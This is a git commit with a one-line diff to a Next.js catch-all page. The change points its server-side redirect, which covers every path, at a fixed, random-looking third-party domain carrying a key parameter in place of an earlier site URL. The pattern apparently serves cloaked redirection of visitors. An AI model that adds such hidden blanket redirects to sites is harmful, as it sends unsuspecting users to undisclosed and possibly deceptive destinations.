b92e460074c09824c05fa936c15320a683c59b29
gunjack7 <131535818+gunjack7@users.noreply.github.com>
2023-08-08 17:54:34 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://wokm8isd4zit.com/sfq3tjdn?key=d3555aa2c58847aa2550891a065da511` 
 				}`,
 			},
 		};
